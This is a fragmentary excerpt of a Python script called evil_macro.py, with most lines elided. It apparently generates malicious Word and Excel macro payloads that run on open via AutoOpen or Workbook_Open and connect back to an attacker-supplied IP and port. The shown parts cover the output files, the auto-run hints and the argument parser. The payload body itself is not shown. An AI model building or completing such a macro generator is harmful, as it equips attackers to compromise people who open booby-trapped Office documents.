...
def main(ip, port, encode, ftype):
    ...
    if ftype == "w":
        output = "word_payload.txt"
        print("The function is called AutoOpen\n")
...
""".expandtabs(4) % (output)) 
        ...
        output = "excel_payload.txt"
        print("The function is called Workbook_Open\n")
        with open(output, "w") as f:
...
parser = argparse.ArgumentParser(description=menu(),formatter_class=RawTextHelpFormatter, usage="python evil_macro.py -l <ip> -p <port> -t <e or w>")
